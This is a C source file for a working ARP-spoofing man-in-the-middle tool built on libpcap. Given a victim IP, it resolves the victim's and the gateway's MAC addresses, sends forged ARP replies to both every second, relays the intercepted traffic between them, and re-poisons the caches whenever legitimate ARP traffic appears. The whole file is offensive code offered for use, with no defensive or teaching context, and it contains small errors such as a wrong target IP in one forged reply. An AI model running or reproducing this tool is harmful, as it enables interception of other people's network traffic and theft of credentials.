#include <sys/socket.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <ifaddrs.h>
#include <pthread.h>
#include <net/if.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <pcap.h>

#define ARPPACKETSIZE 28
#define MACADDRLEN 18
#define IPADDRLEN 16

#define TOVICTIM 0x2120		// Send infection packet to victim
#define TOGATEWAY 0x2430	// Send infection packet to gateway

#pragma pack(push, 1)
struct ETH_Header {
	unsigned char DstMacAddr[6];
	unsigned char SrcMacAddr[6];
	unsigned short EtherType;
#define ETHERTYPEIP  0x0800
#define ETHERTYPEARP 0x0806
};

struct ARP_Header {
	unsigned short HardwareType;
#define HWTETHERNET 1
	unsigned short ProtocolType;
#define PROTOTYPEIP 0x0800
	unsigned char HardwareAddressLength;
	unsigned char ProtocolAddressLength;
#define IPV4SIZE 4
#define MACSIZE 6
	unsigned short OperationCode;
#define OP_REQUEST 1
#define OP_REPLY   2
	unsigned char SourceHardwareAddress[6];
	unsigned int SourceProtocolAddress;
	unsigned char TargetHardwareAddress[6];
	unsigned int TargetProtocolAddress;
};

struct PACKET_Header {
	struct ETH_Header ETH_Packet;
	struct ARP_Header ARP_Packet;
};

struct IPMACADDR {
	char MyMacAddrStr[MACADDRLEN];
	char VictimMacAddrStr[MACADDRLEN];
	char GatewayMacAddrStr[MACADDRLEN];
	char MyIpAddrStr[IPADDRLEN];
	char VictimIpAddrStr[IPADDRLEN];
	char GatewayIpAddrStr[IPADDRLEN];
	unsigned char MyMacAddrHex[MACSIZE];
	unsigned char VictimMacAddrHex[MACSIZE];
	unsigned char GatewayMacAddrHex[MACSIZE];
	unsigned int MyIpAddrHex;
	unsigned int VictimIpAddrHex;
	unsigned int GatewayIpAddrHex;
};

struct args {
	unsigned char* DestMacAddr;
	unsigned int SourceIpAddr;
};
#pragma pack(pop)

bool GetMyIpAddr(char*, struct IPMACADDR*);
bool GetMyMacAddr(char*, struct IPMACADDR*);
bool GetMyGatewayIpAddr(char*, struct IPMACADDR*);
bool PcapFiltering(pcap_t**, char*);
void SetDefaultARP(struct ARP_Header*, unsigned char*, unsigned int, unsigned char*, unsigned int, int);
void SetDefailtETH(struct ETH_Header*, unsigned char*, unsigned char*);
bool GetVictimGatewayMacAddr(char*, struct IPMACADDR*);
bool SendInfectionPacket(pcap_t*, struct IPMACADDR*, int);
void* RecvInfectionResponse(void*);
void* PacketRelayVictim(void*);
void* PacketRelayGateway(void*);
void* ReInfection(void*);
int main(int argc, char* argv[]) {
	unsigned int Net_Hex, Mask_Hex;
	char *device, errbuf[PCAP_ERRBUF_SIZE];
	struct IPMACADDR IpMacAddr = { 0, };
	struct in_addr inaddr;
	pthread_t Relay_Victim, Relay_Gateway, Re_Infection;
	pcap_t* handle;

	if (argc < 2) {
		printf("Usage : %s <victim ip>\n", argv[0]);
		return -1;
	}

	// Get Network Interface Name
	device = pcap_lookupdev(errbuf);
	if (device == NULL) {
		printf("pcap_lookupdev() : %s\n", errbuf);
		return -1;
	}
	printf("Network Interface : %s\n", device);

	// Get My IP Address
	if (GetMyIpAddr(device, &IpMacAddr) == false) {
		printf("Can't get my IP address\n");
		return -1;			
	}

	inaddr.s_addr = IpMacAddr.MyIpAddrHex;
	inet_ntop(AF_INET, &inaddr, IpMacAddr.MyIpAddrStr, IPADDRLEN);	// Convert to String

	// Get My MAC Address
	if (GetMyMacAddr(device, &IpMacAddr) == false) {
		printf("Can't get my MAC address\n");
		return -1;
	}

	for (int i = 0; i < MACSIZE; i++) 	// Convert to String
		sprintf(IpMacAddr.MyMacAddrStr, "%s%02x%s", IpMacAddr.MyMacAddrStr, IpMacAddr.MyMacAddrHex[i], ((i < (MACSIZE - 1)) ? ":" : "\x00"));

	// Get Gateway's IP Address	
	if (GetMyGatewayIpAddr(device, &IpMacAddr) == false) {
		printf("Can't get my Gateway IP address\n");
		return -1;
	}
 
	// Get Victim IP Address from argv[1]
	inaddr.s_addr = IpMacAddr.GatewayIpAddrHex;
	inet_ntop(AF_INET, &inaddr, IpMacAddr.GatewayIpAddrStr, IPADDRLEN);	// Convert to String

	// Print Information
	printf("My MAC Address : %s\n", IpMacAddr.MyMacAddrStr);
	printf("My IP Address : %s\n", IpMacAddr.MyIpAddrStr);
	printf("My Gateway IP Address : %s\n", IpMacAddr.GatewayIpAddrStr);

	strncpy(IpMacAddr.VictimIpAddrStr, argv[1], IPADDRLEN);
	IpMacAddr.VictimIpAddrHex = inet_addr(IpMacAddr.VictimIpAddrStr);	// Convert to Hex

	if (GetVictimGatewayMacAddr(device, &IpMacAddr) == false) {
		printf("Cat't send ARP Infection Packet\n");
		return -1;
	}

	for (int i = 0; i < MACSIZE; i++)   // Convert to String
		sprintf(IpMacAddr.VictimMacAddrStr, "%s%02x%s", IpMacAddr.VictimMacAddrStr, IpMacAddr.VictimMacAddrHex[i], ((i < (MACSIZE - 1)) ? ":" : "\x00"));

	for (int i = 0; i < MACSIZE; i++)   // Convert to String
		sprintf(IpMacAddr.GatewayMacAddrStr, "%s%02x%s", IpMacAddr.GatewayMacAddrStr, IpMacAddr.GatewayMacAddrHex[i], ((i < (MACSIZE - 1)) ? ":" : "\x00"));

	printf("Gateway MAC Address : %s\n", IpMacAddr.GatewayMacAddrStr);
	printf("Victim MAC Address : %s\n", IpMacAddr.VictimMacAddrStr);

	handle = pcap_open_live(device, BUFSIZ, 0, -1, errbuf);
	if (handle == NULL) {
		printf("pcap_open_live() : %s\n", errbuf);
		return -1;
	}

	// Victim spoofed packet relay thread
	if (pthread_create(&Relay_Victim, NULL, PacketRelayVictim, (void*)&IpMacAddr) != 0) {
		perror("pthread_create() : ");
		return -1;
	}

	// Gateway spoofed packet relay thread
	if (pthread_create(&Relay_Gateway, NULL, PacketRelayGateway, (void*)&IpMacAddr) != 0) {
		perror("pthread_create() : ");
		return -1;
	}

	// detect recover arp table and re-infect
	if (pthread_create(&Re_Infection, NULL, ReInfection, (void*)&IpMacAddr) != 0) {
		perror("pthread_create()");
		return -1;
	}

	// Send Infection packet (10s)
	while (1) {
		printf("hi\n");
		SendInfectionPacket(handle, &IpMacAddr, TOVICTIM);
		SendInfectionPacket(handle, &IpMacAddr, TOGATEWAY);
		sleep(1);
	}

	return 0;
}

bool GetMyIpAddr(char* device, struct IPMACADDR* IpMacAddr) {
	struct ifaddrs* ifaddr, *ifa;
	struct sockaddr_in* inaddr;

	if (getifaddrs(&ifaddr) == -1) {
		perror("getifaddrs() : ");
		exit(-1);
	}

	for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
		if (ifa->ifa_addr == NULL) 
			continue;

		if ((strcmp(ifa->ifa_name, device) == 0) && (ifa->ifa_addr->sa_family == AF_INET)) {
			inaddr = (struct sockaddr_in*)ifa->ifa_addr;
			IpMacAddr->MyIpAddrHex = inaddr->sin_addr.s_addr;

			freeifaddrs(ifaddr);
			return true;
		}
	}

	freeifaddrs(ifaddr);
	return false;
}

bool GetMyMacAddr(char* device, struct IPMACADDR* IpMacAddr) {
	struct ifreq ifr;
	int fd;

	fd = socket(AF_INET, SOCK_DGRAM, 0);

	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, device, strlen(device));

	if (ioctl(fd, SIOCGIFHWADDR, &ifr) == 0) {
		memcpy(IpMacAddr->MyMacAddrHex, ifr.ifr_hwaddr.sa_data, MACSIZE);
		close(fd);

		return true;
	}
	close(fd);

	return false;
}

bool GetMyGatewayIpAddr(char* device, struct IPMACADDR* IpMacAddr) {
	char* interface = NULL, *Gateway = NULL;
	char line[100];
	FILE* fp;

	fp = fopen("/proc/net/route", "rt");
	if (fp == NULL) {
		printf("can't open /proc/net/route\n");
		return false;
	}

	while (fgets(line, 100, fp)) {
		interface = strtok(line, "\t");
		if (strcmp(interface, device) != 0) 
			continue;

		for (int i = 0; i < 2; i++) 
			Gateway = strtok(NULL, "\t");

		if (strcmp(Gateway, "00000000") == 0) 
			continue;

		break;
	}
	IpMacAddr->GatewayIpAddrHex = strtol(Gateway, NULL, 16);
	fclose(fp);

	return true;
}

bool PcapFiltering(pcap_t** handle, char* filter) {
	unsigned int net, mask;
	char* device;
	char errbuf[PCAP_ERRBUF_SIZE];
	struct bpf_program fp;

	device = pcap_lookupdev(errbuf);
	if (device == NULL) {
		printf("pcap_lookupdev() : %s\n", errbuf);
		return false;
	}

	if (pcap_lookupnet(device, &net, &mask, errbuf) == -1) {
		printf("pcap_lookupnet() : %s\n", errbuf);
		return false;
	}

	*handle = pcap_open_live(device, BUFSIZ, 0, -1, errbuf);
	if (*handle == NULL) {
		printf("pcap_open_live() : %s\n", errbuf);
		return false;
	}

	if (pcap_compile(*handle, &fp, filter, 0, net) == -1) {
		printf("pcap_compile() : %s\n", pcap_geterr(*handle));
		return false;
	}

	if (pcap_setfilter(*handle, &fp) == -1) {
		printf("pcap_setfilter() : %s\n", pcap_geterr(*handle));
		return false;
	}

	return true;
}

void SetDefaultARP(struct ARP_Header* packet, unsigned char* SourceMacAddr, unsigned int SourceIpAddr, unsigned char* DestMacAddr, unsigned int DestIpAddr, int Operation) {
	packet->HardwareType = htons(HWTETHERNET);
	packet->ProtocolType = htons(PROTOTYPEIP);
	packet->HardwareAddressLength = MACSIZE;
	packet->ProtocolAddressLength = IPV4SIZE;
	packet->OperationCode = htons(Operation);
	for (int i = 0; i < MACSIZE; i++) 
		packet->SourceHardwareAddress[i] = SourceMacAddr[i];
	packet->SourceProtocolAddress = SourceIpAddr;
	for (int i = 0; i < MACSIZE; i++)
		packet->TargetHardwareAddress[i] = DestMacAddr[i];
	packet->TargetProtocolAddress = DestIpAddr;
}

void SetDefaultETH(struct ETH_Header* packet, unsigned char* SourceMacAddr, unsigned char* DestMacAddr) {
	for (int i = 0; i < MACSIZE; i++) 
		packet->DstMacAddr[i] = DestMacAddr[i];
	for (int i = 0; i < MACSIZE; i++) 
		packet->SrcMacAddr[i] = SourceMacAddr[i];
	packet->EtherType = htons(ETHERTYPEARP);
}

bool GetVictimGatewayMacAddr(char* device, struct IPMACADDR* IpMacAddr) {
	unsigned char ETHBroadCasting[MACSIZE] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff }, ARPBroadCasting[MACSIZE] = { 0x00, };
	unsigned char *GatewayMacAddr, *VictimMacAddr;
	char errbuf[PCAP_ERRBUF_SIZE];
	struct PACKET_Header Packet_Victim, Packet_Gateway, Infection_Victim, Infection_Gateway;
	struct args pThread_args;
	pthread_t pThread_Gateway, pThread_Victim;
	pcap_t* handle;

	SetDefaultARP(&Packet_Victim.ARP_Packet, IpMacAddr->MyMacAddrHex, IpMacAddr->MyIpAddrHex, ARPBroadCasting, IpMacAddr->VictimIpAddrHex, OP_REQUEST);
	SetDefaultARP(&Packet_Gateway.ARP_Packet, IpMacAddr->MyMacAddrHex, IpMacAddr->MyIpAddrHex, ARPBroadCasting, IpMacAddr->GatewayIpAddrHex, OP_REQUEST);
	SetDefaultETH(&Packet_Victim.ETH_Packet, IpMacAddr->MyMacAddrHex, ETHBroadCasting);
	SetDefaultETH(&Packet_Gateway.ETH_Packet, IpMacAddr->MyMacAddrHex, ETHBroadCasting);

	handle = pcap_open_live(device, BUFSIZ, 0, 1000, errbuf);
	if (handle == NULL) {
		printf("pcap_open_live() : %s\n", errbuf);
		return false;
	}

	pThread_args.DestMacAddr = IpMacAddr->MyMacAddrHex;
	pThread_args.SourceIpAddr = IpMacAddr->GatewayIpAddrHex;
	if (pthread_create(&pThread_Gateway, NULL, RecvInfectionResponse, (void*)&pThread_args) != 0) {
		perror("pthread_create() : ");
		return false;
	}

	sleep(1);	// for thread

	if (pcap_sendpacket(handle, (unsigned char*)&Packet_Gateway, sizeof(struct PACKET_Header)) != 0) {
		printf("pcap_sndpacket() : %s\n",pcap_geterr(handle));
		return false;
	}
	pthread_join(pThread_Gateway, (void**)&GatewayMacAddr);	// wait thread
	memcpy(IpMacAddr->GatewayMacAddrHex, GatewayMacAddr, MACSIZE);

	pThread_args.SourceIpAddr = IpMacAddr->VictimIpAddrHex;
	if (pthread_create(&pThread_Victim, NULL, RecvInfectionResponse, (void*)&pThread_args) != 0) {
		perror("pthread_create() : ");
		return false;
	}

	sleep(1);	// for thread

	if (pcap_sendpacket(handle, (unsigned char*)&Packet_Victim, sizeof(struct PACKET_Header)) != 0) {
		printf("pcap_sndpacket() : %s\n",pcap_geterr(handle));
		return false;
	}
	pthread_join(pThread_Victim, (void**)&VictimMacAddr);	// wait thread
	memcpy(IpMacAddr->VictimMacAddrHex, VictimMacAddr, MACSIZE);

	SendInfectionPacket(handle, IpMacAddr, TOVICTIM);
	SendInfectionPacket(handle, IpMacAddr, TOGATEWAY);

	return true;
}

bool SendInfectionPacket(pcap_t* handle, struct IPMACADDR* IpMacAddr, int Mode) {
	struct PACKET_Header Infection;
	
	if (Mode == TOVICTIM) {
		SetDefaultARP(&Infection.ARP_Packet, IpMacAddr->MyMacAddrHex, IpMacAddr->GatewayIpAddrHex, IpMacAddr->VictimMacAddrHex, IpMacAddr->VictimIpAddrHex, OP_REPLY);
		SetDefaultETH(&Infection.ETH_Packet, IpMacAddr->MyMacAddrHex, IpMacAddr->VictimMacAddrHex);
	}

	else if (Mode == TOGATEWAY) {
		SetDefaultARP(&Infection.ARP_Packet, IpMacAddr->MyMacAddrHex, IpMacAddr->VictimIpAddrHex, IpMacAddr->VictimMacAddrHex, IpMacAddr->VictimIpAddrHex, OP_REPLY);
		SetDefaultETH(&Infection.ETH_Packet, IpMacAddr->MyMacAddrHex, IpMacAddr->GatewayMacAddrHex);
	}

	else {
		printf("Elegal Mode\n");
		return false;
	}

	if (pcap_sendpacket(handle, (unsigned char*)&Infection, sizeof(struct PACKET_Header)) != 0) {
		printf("pcap_sndpacket() : %s\n",pcap_geterr(handle));
		return false;
	}

	return true;
}

void* RecvInfectionResponse(void* pThread_args) {
	unsigned char *DestMacAddr;
	unsigned int SourceIpAddr;
	char filter[BUFSIZ] = "ether proto \\arp";
	int ret;
	struct PACKET_Header* packet;
	pcap_pkthdr* pkthdr;
	pcap_t* handle;

	DestMacAddr = ((struct args*)pThread_args)->DestMacAddr;
	SourceIpAddr = ((struct args*)pThread_args)->SourceIpAddr;

	if (PcapFiltering(&handle, filter) == false) {
		printf("Fail to filtering\n");
		return (void*)-1;
	}

	while (1) {
		ret = pcap_next_ex(handle, &pkthdr, (const unsigned char**)&packet);
		if (ret == 0) 
			continue;
		else if (ret == -1) {
			printf("pcap_next_ex() : %s\n",pcap_geterr(handle));
			return (void*)-1;
		}
		
		if ((ntohs(packet->ARP_Packet.OperationCode) == OP_REPLY) && (packet->ARP_Packet.SourceProtocolAddress == SourceIpAddr)) 
			return (void*)packet->ARP_Packet.SourceHardwareAddress;
	}
	return (void*)-1;
}

void* PacketRelayVictim(void* args) {
	char filter[BUFSIZ];
	int ret;
	struct PACKET_Header* packet;
	struct IPMACADDR* IpMacAddr;
	pcap_pkthdr* pkthdr;
	pcap_t* handle;

	IpMacAddr = (struct IPMACADDR*)args;

	sprintf(filter, "ether src %s && not ip dst %s", IpMacAddr->VictimMacAddrStr, IpMacAddr->MyIpAddrStr);
	if (PcapFiltering(&handle, filter) == false) {
		printf("Fail to filtering\n");
		return (void*)-1;
	}
	
	while (1) {
		ret = pcap_next_ex(handle, &pkthdr, (const unsigned char**)&packet);
		if (ret == 0) 
			continue;
		else if (ret == -1) {
			printf("pcap_next_ex() : %s\n",pcap_geterr(handle));
			return (void*)-1;
		}

		memcpy(packet->ETH_Packet.DstMacAddr, IpMacAddr->GatewayMacAddrHex, MACSIZE);
		memcpy(packet->ETH_Packet.SrcMacAddr, IpMacAddr->MyMacAddrHex, MACSIZE);
		
		printf("Victim Relay : %d\n", pkthdr->len);
		if (pcap_sendpacket(handle, (const unsigned char*)packet, pkthdr->len) == -1) 
			printf("pcap_sendpacket() : %s\n",pcap_geterr(handle));
	}

	return (void*)0;
}

void* PacketRelayGateway(void* args) {
	char filter[BUFSIZ];
	int ret;
	struct PACKET_Header* packet;
	struct IPMACADDR* IpMacAddr;
	pcap_pkthdr* pkthdr;
	pcap_t* handle;

	IpMacAddr = (struct IPMACADDR*)args;

	sprintf(filter, "ether src %s && not ip dst %s", IpMacAddr->GatewayMacAddrStr, IpMacAddr->MyIpAddrStr);
	if (PcapFiltering(&handle, filter) == false) {
		printf("Fail to filtering\n");
		return (void*)-1;
	}

	while (1) {
		ret = pcap_next_ex(handle, &pkthdr, (const unsigned char**)&packet);
		if (ret == 0) 
			continue;
		else if (ret == -1) {
			printf("pcap_next_ex() : %s\n",pcap_geterr(handle));
			return (void*)-1;
		}

		memcpy(packet->ETH_Packet.DstMacAddr, IpMacAddr->VictimMacAddrHex, MACSIZE);
		memcpy(packet->ETH_Packet.SrcMacAddr, IpMacAddr->MyMacAddrHex, MACSIZE);
		printf("Gateway Relay : %d\n", pkthdr->len);		
		if (pcap_sendpacket(handle, (const unsigned char*)packet, pkthdr->len) == -1) 
			printf("pcap_sendpacket() : %s\n",pcap_geterr(handle));
	}

	return (void*)0;
}

void* ReInfection(void* args) {
	char filter[BUFSIZ];
	int ret;
	struct PACKET_Header* packet;
	struct IPMACADDR* IpMacAddr;
	pcap_pkthdr* pkthdr;
	pcap_t* handle;

	IpMacAddr = (struct IPMACADDR*)args;

	sprintf(filter, "ether proto \\arp && (ether src %s || ether src %s)", IpMacAddr->VictimMacAddrStr, IpMacAddr->GatewayMacAddrStr);
	if (PcapFiltering(&handle, filter) == false) {
		printf("Fail to filtering\n");
		return (void*)-1;
	}

	while (1) {
		ret = pcap_next_ex(handle, &pkthdr, (const unsigned char**)&packet);
		if (ret == 0)
			continue;
		else if (ret == -1) {
			printf("pcap_next_ex() : %s\n", pcap_geterr(handle));
			return (void*)-1;
		}

		if (memcmp(packet->ETH_Packet.SrcMacAddr, IpMacAddr->VictimMacAddrHex, MACSIZE) == 0) 
			SendInfectionPacket(handle, IpMacAddr, TOGATEWAY);
		else 
			SendInfectionPacket(handle, IpMacAddr, TOVICTIM);
	}
}
